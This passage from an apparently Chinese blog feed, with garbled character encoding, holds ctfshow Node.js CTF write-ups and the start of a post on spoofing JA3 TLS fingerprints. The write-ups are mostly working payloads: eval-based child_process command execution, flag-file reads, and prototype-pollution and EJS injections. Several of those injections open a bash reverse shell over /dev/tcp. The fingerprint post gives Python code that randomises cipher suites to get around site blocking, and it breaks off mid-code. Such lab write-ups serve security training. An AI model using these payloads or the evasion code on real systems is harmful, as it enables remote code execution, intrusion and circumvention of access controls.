class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">stdout</span>;</span><br><span class="line">?<span class="built_in">eval</span>=<span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ä»¶æ“ä½œ</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readdirSync</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;fl001g.txt&#x27;</span>);</span><br></pre></td></tr></table></figure></p><h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>ä¼ å…¥<br><code>require(&#39;child_process&#39;).execSync(&#39;ls /&#39;).toString()</code><br><code>require(&#39;child_process&#39;).exec(&#39;ls /&#39;)</code><br>å‡å›æ˜¾tqlï¼Œç›²çŒœè¿‡æ»¤äº†exec<br>ä½¿ç”¨<br><code>require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[]).output;</code><br><code>require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl001g.txt&#39;]).output;</code><br>æˆ–è€…web335çš„è¯»æ–‡ä»¶æ“ä½œ</p><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼äºphpçš„ä¼ è¾“å…¥<br>payload: <code>/?a[x]=1&amp;b[x]=1</code></p><h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>åŸå‹é“¾æ±¡æŸ“ï¼š<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>çœ‹åˆ°copyè¿™ä¸ªå‡½æ•°çš„å®ç°ï¼Œå¯ä»¥æƒ³åˆ°åŸå‹é“¾æ±¡æŸ“<br>æ ¹æ®app.jsçš„è·¯ç”±ï¼ŒçŸ¥é“æ˜¯routes/login.jsè¿™ä¸ªæ–‡ä»¶<br>é‚£ä¹ˆåªéœ€è¦æŠ“å–ç™»å½•åŒ…ï¼ŒæŠŠpostå†…å®¹æ”¹ä¸º<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code><br>å³å¯è·å–flag</p><h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><blockquote><p>åœ¨åšä¹‹å‰è°ƒè¯•äº†ä¸€ä¸‹nodejsï¼Œå‘ç°åŸå‹é“¾æ±¡æŸ“å®Œä»¥åï¼Œåœ¨ä¸‹æ¬¡é‚£ä¸ªè¢«æ±¡æŸ“çš„è¿˜æ˜¯è¢«æ±¡æŸ“ï¼Œå¹¶ä¸ä¼šåœ¨ä¸‹æ¬¡è®¿é—®çš„æ—¶å€™å°±å˜æˆæœªè¢«æ±¡æŸ“çš„çŠ¶æ€</p></blockquote><h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åªè¦æŠŠqueryè¿›è¡Œå˜é‡è¦†ç›–ï¼Œå°±å¯ä»¥è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ</p><blockquote><p><strong>æ³¨æ„è¿™é‡Œæ˜¯å¤§å†™Functionï¼Œæ˜¯ä¸€ä¸ªæ„é€ å™¨ï¼Œå¯ä»¥æŠŠè¿™é‡Œåˆ†è§£ä¸ºä¸¤æ­¥çœ‹</strong><br><img src="/2022/11/28/ctfshow-nodejs/2.jpg" alt></p></blockquote><p>ç”¨å¦‚ä¸‹payloadè®¿é—®loginé¡µé¢<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code><br>æˆåŠŸå°†queryè¿›è¡Œè¦†ç›–ï¼Œå†å»è®¿é—®apié‚£ä¸ªé¡µé¢ï¼Œå°±ä¼šåå¼¹shell</p><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>ä¸»è¦æ˜¯ä¸€ä¸ªejsRCEï¼Œå‚è€ƒé“¾æ¥ï¼š<a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/</a><br><code>&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p><h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™æ¬¡æ˜¯å¤åˆ¶user.userinfoçš„å¯¹è±¡ï¼Œæ‰€ä»¥éœ€è¦ä¸¤å±‚<strong>proto</strong>ï¼Œæ‰èƒ½æ±¡æŸ“åˆ°æœ€é¡¶ç«¯çš„å€¼ï¼Œä¹Ÿå°±æ˜¯<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></p><h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p>ä½¿ç”¨ejsRCEè¿›è¡Œåå¼¹shellï¼Œä½†æ˜¯è¿™æ¬¡renderç‚¹åœ¨index.js<br>æ‰€ä»¥å¯¹loginè¿›è¡Œäº†åŸå‹é“¾æ±¡æŸ“ä»¥åï¼Œéœ€è¦åœ¨è®¿é—®ä¸€æ¬¡index.jsæ‰èƒ½åå¼¹shell</p><h2 id="web342-web343"><a href="#web342-web343" class="headerlink" title="web342   web343"></a>web342   web343</h2><p><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a><br>å¯ä»¥æ ¹æ®è¿™ç¯‡æ–‡ç« è¿›è¡Œè°ƒè¯•<br>æ ¸å¿ƒå°±æ˜¯æ‰¾åˆ°å¯è¦†ç›–ç‚¹ï¼ˆå¯æ’å…¥åˆ°æ¨¡æ¿ä¸­ï¼Œä¸”ä¸ºundefinedï¼‰</p><blockquote><p><strong>ä¸ºä»€ä¹ˆè¦undefined</strong><br>å› ä¸ºåªæœ‰åœ¨æŸä¸ªå¯¹è±¡ä»–æ²¡æœ‰å®šä¹‰è¿™ä¸ªå˜é‡çš„æ—¶å€™æ‰ä¼šå‘ä¸Šçš„prototypeå»å¯»æ‰¾ï¼Œå¦åˆ™å°±ç®—æ±¡æŸ“äº†åŸå‹é“¾ä¹Ÿæ˜¯æ²¡æ³•åˆ©ç”¨çš„</p></blockquote><p>æ³¨æ„è¿™é‡Œçš„payloadè¦ç”¨execSyncï¼Œä¸èƒ½ç”¨exec</p><h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>è¿™é¢˜å…³é”®æ˜¯å¤šä¸ªç›¸åŒçš„å‚æ•°ä¼ é€’è¿‡å»ï¼Œnodejsä¼šå°†å…¶æ‹¼æ¥ä¸ºåˆ—è¡¨çš„å½¢å¼<br><img src="/2022/11/28/ctfshow-nodejs/3.jpg" alt><br><img src="/2022/11/28/ctfshow-nodejs/4.jpg" alt><br>è¿™é‡Œä¼ å‚çš„æ—¶å€™è¦æŠŠpayloadå¤åˆ¶åˆ°burpé‡Œé¢ï¼Œå¦‚æœæµè§ˆå™¨ç›´æ¥è®¿é—®ï¼Œä¼šå‡ºä¸€äº›ç¼–ç é”™è¯¯<br>payload<br><code>query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;web334&quot;&gt;&lt;a href=&quot;#web334&quot; class=&quot;headerlink&quot; title=&quot;web334&quot;&gt;&lt;/a&gt;web334&lt;/h2&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="nodejs" scheme="http://example.com/tags/nodejs/"/>
    
    <category term="ctfshow" scheme="http://example.com/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>çªç ´é™åˆ¶è®¿é—®-ä¿®æ”¹ja3æŒ‡çº¹</title>
    <link href="http://example.com/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/"/>
    <id>http://example.com/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/</id>
    <published>2022-10-22T02:59:41.000Z</published>
    <updated>2022-10-22T10:22:03.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>å› ä¸ºåœ¨t00lsä¸Šçœ‹åˆ°æœ‰äººæé—®ï¼Œä»£ç†äº†ipä¹Ÿæ— æ³•çªç ´é™åˆ¶è®¿é—®<br><span id="more"></span><br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/1.jpg" alt><br>æˆ‘å°±æƒ³åˆ°äº†å¯èƒ½æ˜¯å¯¹æ–¹ç½‘ç«™æ˜¯è¯†åˆ«äº†ä½ çš„tlsç‰¹å¾<br>é‚£ä¹ˆå°±éœ€è¦ä¿®æ”¹è¿™äº›ç‰¹å¾ï¼Œå»çªç ´è®¿é—®é™åˆ¶</p><h2 id="å…¥é—¨ja3æŒ‡çº¹"><a href="#å…¥é—¨ja3æŒ‡çº¹" class="headerlink" title="å…¥é—¨ja3æŒ‡çº¹"></a>å…¥é—¨ja3æŒ‡çº¹</h2><h3 id="TLSä¼šè¯"><a href="#TLSä¼šè¯" class="headerlink" title="TLSä¼šè¯"></a>TLSä¼šè¯</h3><p>å› ä¸ºja3æŒ‡çº¹æ˜¯åŸºäºTLSåè®®çš„ï¼Œæ‰€ä»¥è¦å…ˆç®€å•äº†è§£ä¸€ä¸‹è¿™ä¸ªåè®®<br>TLSæ˜¯sslçš„è¿›é˜¶ç‰ˆæœ¬ï¼Œç”¨äºåŠ å¯†ä¼šè¯<br>å½“åˆå§‹åŒ–ä¸€ä¸ªTLSä¼šè¯çš„æ—¶å€™ï¼Œéœ€è¦è¿›è¡Œå…ˆè¿›è¡Œæœ€åŸºæœ¬çš„ä¸‰æ¬¡æ¡æ‰‹<br>åœ¨ä¸‰æ¬¡æ¡æ‰‹åï¼Œå®¢æˆ·ç«¯ä¼šå‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ªClient HelloåŒ…ï¼Œç„¶åæœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€Server HelloåŒ…ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™ä¸ªClient HelloåŒ…<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/2.jpg" alt></p><h3 id="Client-HelloåŒ…åŸºæœ¬ç»“æ„"><a href="#Client-HelloåŒ…åŸºæœ¬ç»“æ„" class="headerlink" title="Client HelloåŒ…åŸºæœ¬ç»“æ„"></a>Client HelloåŒ…åŸºæœ¬ç»“æ„</h3><p><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/3.jpg" alt></p><p><br><br>è¿™é‡Œåªéœ€è¦å…³æ³¨å‡ ä¸ªå­—æ®µå°±è¡Œäº†</p><p>version:TLSçš„ç‰ˆæœ¬,è¿™é‡Œæ˜¯0x0303<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/4.jpg" alt></p><p><br><br>Cipher Suites:åˆ—ä¸¾å‡ºå®¢æˆ·ç«¯æ”¯æŒçš„åŠ å¯†ç®—æ³•ï¼Œæ¯ä¸€ç§åŠ å¯†ç®—æ³•å¯¹åº”ä¸€ä¸ªhexå€¼<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/5.jpg" alt></p><p><br><br>ä¸€ç³»åˆ—Extensionï¼Œæ¯ä¸ªéƒ½æœ‰ä¸åŒçš„å«ä¹‰ï¼Œè¿™é‡Œä¸éœ€è¦å…³æ³¨å…·ä½“ç”¨å¤„ï¼Œåªè¦çŸ¥é“æ˜¯ç”¨ä¸€ä¸ªåå…­è¿›åˆ¶å€¼å»ä»£è¡¨æ¯ä¸€ç§extensionçš„å°±å¯ä»¥äº†<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/6.jpg" alt></p><h3 id="ja3æŒ‡çº¹è®¡ç®—"><a href="#ja3æŒ‡çº¹è®¡ç®—" class="headerlink" title="ja3æŒ‡çº¹è®¡ç®—"></a>ja3æŒ‡çº¹è®¡ç®—</h3><p>ja3çš„è®¡ç®—ä¸»è¦å°±æ˜¯ç”±ä¸Šé¢é‚£å‡ ä¸ªå­—æ®µçš„åè¿›åˆ¶ç»„åˆåœ¨ä¸€èµ·ï¼Œç„¶åè®¡ç®—ä»–ä»¬çš„md5ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š<br><strong>TLSVersion,Cipher Suites,Extensions Type,Supported Groups,Elliptic curves point formats</strong><br>å½“ä¸€ä¸ªå­—æ®µæœ‰ä¸åŒçš„ç±»å‹ï¼Œå°±ç”¨ â€œ-â€ æŒ‰ç…§<strong>é¡ºåº</strong>ä¾æ¬¡å»è¿æ¥ï¼Œè¿™ä¸ªé¡ºåºå¾ˆé‡è¦ä¸€ä¼šå„¿ä¼šæåˆ°<br>ä¾‹å¦‚æˆ‘è¿™é‡Œå°±æ˜¯<br><strong>771,4866-4867-4865-157-49313-49309-156-49312-49308-61-60-53-47-163-159-52394-49315-49311-49239-49235-162-158-49314-49310-49238-49234-107-106-196-195-103-64-190-189-57-56-136-135-51-50-69-68-49196-49200-49327-49325-49188-49192-49162-49172-49233-49232-192-186-132-65-52393-52392-49245-49249-49195-49199-49326-49324-49244-49248-49267-49271-49187-49191-49266-49270-49161-49171-255,0-11-10-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2</strong><br>è¿›è¡Œmd5åŠ å¯†åå°±æ˜¯ja3æŒ‡çº¹äº†<br><strong>a6b4648af79cb0e6c9070f2fca7d5ac2</strong></p><p>ä¸‹é¢æˆ‘ä¾æ¬¡ä»‹ç»æ¯å—ç¬¬ä¸€ä¸ªæ•°å­—çš„ç”±æ¥</p><p>771å°±æ˜¯0x0303çš„åè¿›åˆ¶<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/14.jpg" alt><br><br><br>4866å°±æ˜¯ï¼Œ0x1302çš„åè¿›åˆ¶<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/8.jpg" alt><br><br><br>0å°±æ˜¯Extension:Server Nameçš„type<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/9.jpg" alt><br><br><br>29å°±æ˜¯Extension Supported Groupsä¸­çš„Supported Groupsç¬¬ä¸€ä¸ª<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/10.jpg" alt><br><br><br>0å°±æ˜¯Extension ec_point_formatsä¸­Elliptic curves point formatsç¬¬ä¸€ä¸ª<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/11.jpg" alt></p><p>åœ¨wiresharkæœ€ä¸‹é¢ä¹Ÿä¼šæœ‰æ˜¾ç¤ºè¿™ä¸ªja3ï¼Œä½†æ˜¯è¿™ä¸ªå¹¶ä¸ä¼šçœŸæ­£çš„å­˜åœ¨äºæ•°æ®åŒ…ä¸­ï¼Œè€Œæ˜¯æœåŠ¡ç«¯æå–åˆ°å®¢æˆ·ç«¯çš„ç›¸åº”å­—æ®µè¿›è¡Œè®¡ç®—åå¾—åˆ°çš„<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/7.jpg" alt></p><h2 id="ä¼ªé€ ja3æŒ‡çº¹"><a href="#ä¼ªé€ ja3æŒ‡çº¹" class="headerlink" title="ä¼ªé€ ja3æŒ‡çº¹"></a>ä¼ªé€ ja3æŒ‡çº¹</h2><h3 id="ç”¨ä¸åŒä»£ç†å»è®¿é—®ç½‘ç«™"><a href="#ç”¨ä¸åŒä»£ç†å»è®¿é—®ç½‘ç«™" class="headerlink" title="ç”¨ä¸åŒä»£ç†å»è®¿é—®ç½‘ç«™"></a>ç”¨ä¸åŒä»£ç†å»è®¿é—®ç½‘ç«™</h3><p>è¿™ä¸ªç½‘ç«™å¯ä»¥çœ‹åˆ°è‡ªå·±çš„ja3æŒ‡çº¹ <a href="https://kawayiyi.com/tls">https://kawayiyi.com/tls</a><br>æˆ‘è¿™é‡Œæ˜¯ç”¨pandavpnçš„å…¨å±€æ¨¡å¼<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/12.jpg" alt>å¯ä»¥çœ‹åˆ°æˆ‘çš„ipæ˜¯<strong>107.187.83.12</strong>ï¼Œæˆ‘çš„tlsHashMd5ä¹Ÿå°±æ˜¯ja3æŒ‡çº¹æ˜¯<strong>6e43eefeaec91453751b092058ec8dd2</strong><br>å½“æˆ‘æ¢ä¸€ä¸ªipå»è®¿é—®çš„æ—¶å€™<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/13.jpg" alt><br>å¯ä»¥çœ‹åˆ°æˆ‘çš„ipè™½ç„¶å˜æˆäº†<strong>139.64.165.246</strong>ï¼Œä½†æ˜¯tlsHashMd5ï¼ˆja3æŒ‡çº¹ï¼‰ä»ç„¶æ˜¯<strong>6e43eefeaec91453751b092058ec8dd2</strong><br>æ‰€ä»¥æœ‰æ—¶å€™å°±ç®—å„ç§æ¢ä»£ç†ä¹Ÿæ— æ³•è®¿é—®ç½‘ç«™å¯èƒ½å°±æ˜¯è¿™ä¸ªåŸå› ï¼Œè¢«è®°å½•ä¸‹äº†ja3æŒ‡çº¹</p><h3 id="ä¿®æ”¹ja3æŒ‡çº¹"><a href="#ä¿®æ”¹ja3æŒ‡çº¹" class="headerlink" title="ä¿®æ”¹ja3æŒ‡çº¹"></a>ä¿®æ”¹ja3æŒ‡çº¹</h3><p>é‚£ä¹ˆå½“æˆ‘ä»¬å»ä¿®æ”¹Client Helloé‡Œé¢çš„ä¸€äº›ä¿¡æ¯ï¼Œå°±å¯ä»¥è¾¾åˆ°ä¿®æ”¹ja3æŒ‡çº¹çªç ´è®¿é—®é™åˆ¶ï¼Œä¸‹é¢æˆ‘ç›´æ¥è´´å‡ºä¿®æ”¹ä»£ç <br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.util.ssl_ <span class="keyword">import</span> create_urllib3_context</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line">ORIGIN_CIPHERS = (<span class="string">&#x27;ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:&#x27;</span></span><br><span class="line"><span class="string">&#x27;DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DESAdapter</span>(<span class="title class_ inherited__">HTTPAdapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        CIPHERS = ORIGIN_CIPHERS.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        random.shuffle(CIPHERS)</span><br><span class="line">        CIPHERS = <span class="string">&#x27;:&#x27;</span>.join(CIPHERS)</span><br><span class="line">        self.CIPHERS = CIPHERS + <span class="string">&#x27;:!aNULL:!eNULL:!MD5&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title 